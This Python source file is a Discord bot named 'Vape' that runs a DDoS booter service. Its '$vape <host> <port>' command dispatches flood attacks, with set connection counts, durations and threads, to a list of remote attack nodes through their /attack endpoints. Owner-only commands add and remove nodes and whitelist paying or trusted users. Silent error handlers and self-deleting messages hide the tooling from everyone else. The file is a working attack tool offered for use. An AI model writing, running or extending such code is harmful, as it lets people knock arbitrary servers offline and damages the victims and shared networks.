import discord
from discord.ext import commands
import aiohttp
import asyncio
import json
import os
import time
import config

# ─── Persistence ──────────────────────────────────────────────────────────────

BASE_DIR      = os.path.dirname(os.path.abspath(__file__))
APIS_FILE      = os.path.join(BASE_DIR, "apis.json")
WHITELIST_FILE = os.path.join(BASE_DIR, "whitelist.json")

def load_apis() -> dict:
    if os.path.exists(APIS_FILE):
        with open(APIS_FILE) as f:
            return json.load(f)
    return {}

def save_apis(data: dict) -> None:
    with open(APIS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_whitelist() -> set:
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE) as f:
            return set(json.load(f))
    return set()

def save_whitelist(s: set) -> None:
    with open(WHITELIST_FILE, "w") as f:
        json.dump(list(s), f)

# Runtime authorized set — config IDs + persisted whitelist
_authorized: set[int] = set(config.AUTHORIZED_USER_IDS) | load_whitelist()

# ─── Bot ──────────────────────────────────────────────────────────────────────

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)

_cooldown_until: float = 0.0


# ─── Checks ───────────────────────────────────────────────────────────────────

def is_authorized():
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.author.id in _authorized or ctx.author.id == config.OWNER_ID
    return commands.check(predicate)

def is_owner():
    async def predicate(ctx: commands.Context) -> bool:
        return ctx.author.id == config.OWNER_ID
    return commands.check(predicate)


# ─── Helpers ──────────────────────────────────────────────────────────────────

def base_embed(title: str = "") -> discord.Embed:
    e = discord.Embed(title=title, color=config.EMBED_COLOR)
    e.set_footer(text=config.EMBED_FOOTER)
    return e


# ─── Events ───────────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    activity = discord.Activity(
        type=discord.ActivityType.playing,
        name="Powered by Vape Engine!"
    )
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print(f"[Vape] Online as {bot.user}  |  Servers: {len(bot.guilds)}")


# ─── $vape (group) ────────────────────────────────────────────────────────────

@bot.group(name="vape", invoke_without_command=True)
@is_authorized()
async def vape(ctx: commands.Context):
    """$vape <host> <port>  — fire an attack"""
    if ctx.invoked_subcommand is not None:
        return

    parts = ctx.message.content.split()

    # Needs at least: $vape <host> <port>
    if len(parts) < 3:
        return

    host     = parts[1]
    port_str = parts[2]

    try:
        port_int = int(port_str)
        if not (1 <= port_int <= 65535):
            raise ValueError
    except ValueError:
        return

    # ── Cooldown check ────────────────────────────────────────────────────────
    global _cooldown_until
    now = time.time()
    if now < _cooldown_until:
        remaining = int(_cooldown_until - now)
        e = base_embed()
        e.description = f"Vape servers are currently busy.\nTry again in **{remaining}s**."
        e.color = 0xFFFFFF
        await ctx.send(embed=e, delete_after=10)
        return

    _cooldown_until = now + config.DURATION + config.COOLDOWN_EXTRA

    # ── Attack embed ──────────────────────────────────────────────────────────
    e = base_embed("Attack Sent!")
    e.add_field(name="Target",      value=f"`{host}`",                inline=True)
    e.add_field(name="Port",        value=f"`{port_int}`",            inline=True)
    e.add_field(name="Duration",    value=f"`{config.DURATION}s`",    inline=True)
    e.add_field(name="Connections", value=f"`{config.CONNECTIONS:,}`", inline=True)
    e.add_field(name="Threads",     value=f"`{'auto' if config.THREADS == 0 else config.THREADS}`", inline=True)
    e.add_field(name="Mode",        value=f"`{'lownet' if config.LOWNET else 'normal'}`", inline=True)
    await ctx.send(embed=e)

    # ── Fire all nodes ────────────────────────────────────────────────────────
    apis = load_apis()
    if not apis:
        return

    payload = {
        "host":        host,
        "port":        port_int,
        "connections": config.CONNECTIONS,
        "duration":    config.DURATION,
        "threads":     config.THREADS,
        "lownet":      config.LOWNET,
    }

    async def fire(url: str):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(
                    f"{url.rstrip('/')}/attack",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as _:
                    pass
        except Exception:
            pass

    await asyncio.gather(*[fire(v["url"]) for v in apis.values()])


# ─── $vape api ────────────────────────────────────────────────────────────────

@vape.group(name="api", invoke_without_command=True)
@is_owner()
async def vape_api(ctx: commands.Context):
    pass


@vape_api.command(name="add")
@is_owner()
async def vape_api_add(ctx: commands.Context, name: str = None, url: str = None, bandwidth: str = "?"):
    await ctx.message.delete()
    if not name or not url:
        return
    apis = load_apis()
    apis[name] = {"url": url, "bandwidth": bandwidth}
    save_apis(apis)
    e = base_embed()
    e.description = f"Node **{name}** added.\n`{url}`  •  {bandwidth}"
    await ctx.send(embed=e, delete_after=10)


@vape_api.command(name="remove")
@is_owner()
async def vape_api_remove(ctx: commands.Context, name: str = None):
    await ctx.message.delete()
    if not name:
        return
    apis = load_apis()
    if name not in apis:
        e = base_embed()
        e.description = f"Node `{name}` not found."
        await ctx.send(embed=e, delete_after=8)
        return
    del apis[name]
    save_apis(apis)
    e = base_embed()
    e.description = f"Node **{name}** removed."
    await ctx.send(embed=e, delete_after=10)


@vape_api.command(name="status")
@is_owner()
async def vape_api_status(ctx: commands.Context):
    await ctx.message.delete()
    apis = load_apis()
    if not apis:
        e = base_embed()
        e.description = "No nodes configured."
        await ctx.send(embed=e, delete_after=8)
        return

    async def check(name: str, entry: dict):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(
                    f"{entry['url'].rstrip('/')}/ping",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    return name, entry.get("bandwidth", "?"), resp.status == 200
        except Exception:
            return name, entry.get("bandwidth", "?"), False

    results = await asyncio.gather(*[check(n, e) for n, e in apis.items()])

    lines = []
    for name, bw, online in results:
        dot = "🟢" if online else "🔴"
        lines.append(f"{dot}  **{name}**  •  {bw}  •  {'Online' if online else 'Offline'}")

    e = base_embed("Node Status")
    e.description = "\n".join(lines)
    await ctx.send(embed=e, delete_after=30)


# ─── $vape whitelist ──────────────────────────────────────────────────────────

@vape.group(name="whitelist", invoke_without_command=True)
@is_owner()
async def vape_whitelist(ctx: commands.Context):
    pass


@vape_whitelist.command(name="add")
@is_owner()
async def vape_whitelist_add(ctx: commands.Context, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        return
    _authorized.add(member.id)
    wl = load_whitelist()
    wl.add(member.id)
    save_whitelist(wl)
    e = base_embed()
    e.description = f"**{member.display_name}** added to whitelist."
    await ctx.send(embed=e, delete_after=10)


@vape_whitelist.command(name="remove")
@is_owner()
async def vape_whitelist_remove(ctx: commands.Context, member: discord.Member = None):
    await ctx.message.delete()
    if not member:
        return
    _authorized.discard(member.id)
    wl = load_whitelist()
    wl.discard(member.id)
    save_whitelist(wl)
    e = base_embed()
    e.description = f"**{member.display_name}** removed from whitelist."
    await ctx.send(embed=e, delete_after=10)


# ─── Error handlers ───────────────────────────────────────────────────────────

@vape.error
async def vape_error(ctx: commands.Context, error):
    if isinstance(error, commands.CheckFailure):
        pass  # silently ignore — don't delete user's message, don't respond

@vape_api.error
@vape_api_add.error
@vape_api_remove.error
@vape_api_status.error
@vape_whitelist.error
@vape_whitelist_add.error
@vape_whitelist_remove.error
async def owner_cmd_error(ctx: commands.Context, error):
    pass  # completely silent — no response, no deletion, command does not exist to non-owners


# ─── Run ──────────────────────────────────────────────────────────────────────

bot.run(config.BOT_TOKEN)
